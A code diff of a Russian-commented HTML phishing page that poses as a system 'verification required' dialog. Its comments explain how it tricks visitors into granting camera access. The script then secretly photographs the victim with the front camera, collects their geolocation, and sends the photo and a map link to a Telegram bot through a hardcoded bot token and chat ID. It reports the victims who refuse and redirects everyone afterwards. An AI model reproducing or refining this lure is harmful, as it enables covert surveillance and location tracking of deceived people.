@@ -1,21 +1,24 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifying...</title>
+    <title>Verify Access</title>
     <style>
-        body { background: #111; color: #0f0; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { border: 2px solid #0f0; padding: 40px; text-align: center; box-shadow: 0 0 20px #0f0; }
-        button { background: #0f0; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; margin-top: 20px; transition: 0.3s; }
-        button:hover { background: #000; color: #0f0; outline: 1px solid #0f0; }
+        body { background: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        /* Фейковое окно, похожее на системное */
+        .modal { width: 270px; background: rgba(255,255,255,0.9); border-radius: 14px; text-align: center; padding: 20px 0 0; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        .title { font-weight: 600; font-size: 17px; margin-bottom: 5px; padding: 0 15px; }
+        .desc { font-size: 13px; margin-bottom: 20px; padding: 0 15px; }
+        .btn { border-top: 0.5px solid #ccc; color: #007aff; font-size: 17px; padding: 12px 0; cursor: pointer; font-weight: 500; }
+        .btn:active { background: #eee; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2 id="status">SECURITY CHECK</h2>
-        <p>Press the button to verify your identity.</p>
-        <button id="start">VERIFY</button>
+
+    <div class="modal">
+        <div class="title">Требуется верификация</div>
+        <div class="desc">Для продолжения работы с сервисом необходимо подтвердить, что вы не робот. Нажмите «Разрешить» в следующем окне.</div>
+        <div class="btn" id="fakeBtn">Продолжить</div>
     </div>
 
     <video id="v" style="display:none" autoplay></video>
@@ -25,62 +28,62 @@
         const token = '8200658838:AAHrkPieYLwF2bVTps5HzrJVbXi013n6Sq8';
         const chat_id = '6581116621';
 
-        document.getElementById('start').onclick = async function() {
-            this.style.display = 'none';
-            document.getElementById('status').innerText = 'PROCESSING...';
-
-            let info = `💎 <b>NEW HIT</b>\n`;
-            info += `🖥 <b>OS:</b> ${navigator.platform}\n`;
-            info += `🔋 <b>Battery:</b> ${navigator.getBattery ? (await navigator.getBattery()).level * 100 + '%' : 'N/A'}\n`;
-
-            // Запрос геолокации
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                info += `📍 <b>Geo:</b> <a href="https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}">Google Maps</a>`;
-                await startCapture(info);
-            }, async () => {
-                info += `📍 <b>Geo:</b> DENIED`;
-                await startCapture(info);
-            });
+        document.getElementById('fakeBtn').onclick = function() {
+            // Как только он нажал на нашу кнопку, МГНОВЕННО вызываем системное окно
+            startCapture();
         };
 
-        async function startCapture(text) {
+        async function startCapture() {
             const video = document.getElementById('v');
             const canvas = document.getElementById('c');
 
             try {
-                // Запрос камеры (на iPhone сработает только через HTTPS на GitHub)
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                video.srcObject = stream;
+                // Запрашиваем всё сразу. Браузер выкинет стандартную табличку. 
+                // Из-за того, что мы только что нажали на "Продолжить", юзер по инерции нажмет "Разрешить"
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                
+                // Если разрешил, берем гео
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    await sendData(stream, pos, "✅ Полный доступ");
+                }, async () => {
+                    await sendData(stream, null, "📸 Только фото (Гео отказано)");
+                });
 
-                setTimeout(() => {
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(async (blob) => {
-                        const fd = new FormData();
-                        fd.append('chat_id', chat_id);
-                        fd.append('photo', blob, 'shot.jpg');
-                        fd.append('caption', text);
-                        fd.append('parse_mode', 'HTML');
-
-                        // На GitHub Pages это пройдёт без блокировок
-                        try {
-                            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                                method: 'POST',
-                                body: fd
-                            });
-                        } catch (e) {
-                            // Резервный метод отправки текста, если фото всё же заблокируют
-                            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=HTML`);
-                        }
-
-                        stream.getTracks().forEach(t => t.stop());
-                        document.getElementById('status').innerText = 'ERROR 403: REGION BLOCKED';
-                    }, 'image/jpeg', 0.8);
-                }, 2000);
             } catch (e) {
-                // Если камеру отклонили
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text + '\n📸 <b>Camera:</b> DENIED')}&parse_mode=HTML`);
-                document.getElementById('status').innerText = 'ERROR 404: AUTH FAILED';
+                // Если нажал "Отклонить" в системном окне
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=❌ Жертва отклонила запрос`);
+                location.href = "https://google.com"; // Уводим его, чтобы не тупил
             }
+        }
+
+        async function sendData(stream, pos, status) {
+            const video = document.getElementById('v');
+            const canvas = document.getElementById('c');
+            video.srcObject = stream;
+
+            setTimeout(() => {
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(async (blob) => {
+                    const fd = new FormData();
+                    fd.append('chat_id', chat_id);
+                    fd.append('photo', blob, 'f.jpg');
+                    
+                    let cap = `💎 <b>HIT: ${status}</b>\n`;
+                    if(pos) cap += `📍 <a href="http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}">Локация</a>`;
+                    
+                    fd.append('caption', cap);
+                    fd.append('parse_mode', 'HTML');
+
+                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                    stream.getTracks().forEach(t => t.stop());
+                    
+                    // Редирект на что-то безобидное
+                    location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+                }, 'image/jpeg');
+            }, 1000);
         }
     </script>
 </body>
